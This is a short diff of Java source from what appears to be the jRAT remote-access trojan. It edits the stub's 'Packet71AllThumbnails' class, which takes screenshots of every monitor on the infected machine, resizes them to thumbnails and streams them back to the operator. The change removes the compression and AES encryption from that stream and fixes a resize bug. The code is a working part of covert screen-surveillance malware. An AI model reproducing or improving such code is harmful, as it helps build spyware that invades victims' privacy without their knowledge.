@@ -7,11 +7,8 @@ import java.awt.Robot;
 import java.awt.image.BufferedImage;
 import java.io.DataOutputStream;
 
-import se.jrat.common.compress.GZip;
-import se.jrat.common.crypto.Crypto;
 import se.jrat.common.io.StringWriter;
 import se.jrat.common.utils.ImageUtils;
-import se.jrat.stub.Main;
 
 public class Packet71AllThumbnails extends AbstractOutgoingPacket {
 
@@ -30,10 +27,10 @@ public class Packet71AllThumbnails extends AbstractOutgoingPacket {
 				screenBounds.y = 0;
 				
 				BufferedImage image = robot.createScreenCapture(screenBounds);
-				ImageUtils.resize(image, 150, 100);
+				image = ImageUtils.resize(image, 150, 100);
 				
-				byte[] buffer = GZip.compress(Crypto.encrypt(ImageUtils.encode(image), Main.aesKey));
-				
+				byte[] buffer = ImageUtils.encode(image);
+
 				dos.writeInt(buffer.length);
 				dos.write(buffer);
 			}
